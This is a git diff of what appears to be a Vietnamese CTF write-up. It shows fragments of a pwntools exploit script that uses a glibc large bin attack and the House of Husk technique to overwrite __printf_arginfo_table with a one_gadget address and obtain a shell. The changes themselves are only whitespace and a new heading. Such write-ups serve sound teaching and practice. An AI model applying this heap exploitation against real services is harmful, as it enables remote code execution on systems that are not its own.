@@ -83,6 +83,7 @@ p.interactive()
 
 - Một bài heap sử dụng [large bin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/large_bin_attack.c) -> [house of husk](https://wan.io.vn/posts/House-of-Husk/)
 - Tham khảo: https://programmerall.com/article/76072782318/
+
 ```python
 #!/usr/bin/python3
 
@@ -130,7 +131,7 @@ def ed(idx,name, context):
 def sh(idx):
     sla(b'choice:', '4')
     sla(b'people: ', str(idx))
-    
+
 
 GDB()
 # leak libc
@@ -146,12 +147,12 @@ arg = libc.address + 0x1ed7b0
 
 # đưa 3 vào large bin
 cr(b'wan', 0x520, b'wan')           # 0
-# chuẩn bị cho __printf_arginfo_table[0x73] 
+# chuẩn bị cho __printf_arginfo_table[0x73]
 cr(b'wan', 0x510, p64(0xe3afe+libc.address)*0x73)   # 3
 de(3)
 cr(b'wan', 0x540, b'wan')           # 4
 de(4)
-# overwrite chunk_0[3] = __printf_arginfo_table, 
+# overwrite chunk_0[3] = __printf_arginfo_table,
 # nếu large bin attack thành công, sẽ đưa được địa chỉ chunk_0 vào __printf_arginfo_table
 ed(0,b'wan', p64(libc.address+0x1ed010)*3 + p64(arg-0x20))
 # đưa 4 vào large bin
@@ -166,3 +167,4 @@ p.sendlineafter("choice:",b"1337")
 
 p.interactive()
 ```
+## PRETTez
